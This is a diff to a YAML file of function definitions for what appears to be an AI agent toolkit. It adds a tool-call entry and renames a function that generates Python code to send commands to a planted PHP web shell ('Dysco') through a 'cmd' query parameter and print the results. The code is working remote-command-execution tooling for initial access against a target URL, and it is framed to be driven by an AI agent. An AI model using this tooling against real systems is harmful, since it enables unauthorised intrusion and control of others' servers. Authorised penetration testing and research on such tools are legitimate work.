@@ -54,7 +54,7 @@ functions:
         response=request.urlopen(f"{url}?cmd={parse.quote(cmd)}").read().decode().split('<br/>')[3]
         print(response)
 
-  get_php_webshell_dysco_initial_access_exploit:
+  get_php_webshell_dysco_initial_access_exploit_code:
     description: Generate Python Code for a Dysco Webshell Initial Access Exploit
     parameters:
       target_url:
@@ -72,3 +72,18 @@ functions:
         cmd="<command>"
         response=request.urlopen(f"{url}?cmd={parse.quote(cmd)}").read().decode().split('<br/>')[3]
         print(response)
+
+  get_php_webshell_dysco_initial_access_exploit_toolcall:
+    description: Generate Python Code for a Dysco Webshell Initial Access Exploit
+    parameters:
+      target_url:
+        type: string
+        required: true
+        description: The URL to the web shell
+        examples:
+          - 'http://127.0.0.1/shell.php'
+          - 'https://target_host/uploads/webshell'
+    cmdline:
+      - echo
+      - |
+        {"name":"call_php_webshell_dysco","args":{"target_url":"${target_url}","command":"<command>"}}
